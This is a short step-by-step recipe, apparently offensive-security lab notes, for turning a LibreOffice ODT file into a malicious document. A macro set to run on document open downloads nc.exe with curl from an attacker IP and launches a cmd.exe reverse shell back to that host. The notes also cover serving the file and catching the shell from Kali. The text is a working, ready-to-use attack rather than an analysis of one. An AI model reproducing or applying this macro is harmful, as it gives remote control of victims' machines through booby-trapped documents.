This method, downloads nc.exe from kali to the windows machine and then executes a reverse shell back to the kali. Python should be used on kali to serve nc.exe and netcat should be used on kali to catch the shell.

-Create/Open ODT file using libreoffice
-Tools > Macros > Organise Macros > Basic
-Highlight the ODT file name > New
-Set Macro Name and then in macro body add the following code or some other code
~~++~~++~~++~~++~~++~~++~~++~~++~~++~~++~~++~~++~~++~~++~~++
REM  *****  BASIC  *****

Sub Main
Shell("curl http://192.168.45.155/nc.exe -o C:\Windows\Temp\nc.exe")
Shell("C:\Windows\Temp\nc.exe -e cmd.exe 192.168.45.155 888")
End Sub
~~++~~++~~++~~++~~++~~++~~++~~++~~++~~++~~++~~++~~++~~++~~++
-Save the macro (ctrl + s)
-To set the Macro to Automatically Run by Clicking on Tools > Customize
-In the events tab select "Open Document" and then select the "Macro" button.
-In the new window highlight the created macro, then click ok and save (ctrl+s) 
-Macro Executes after upload when opened on the target. Catch reverse shell in nc on kali.









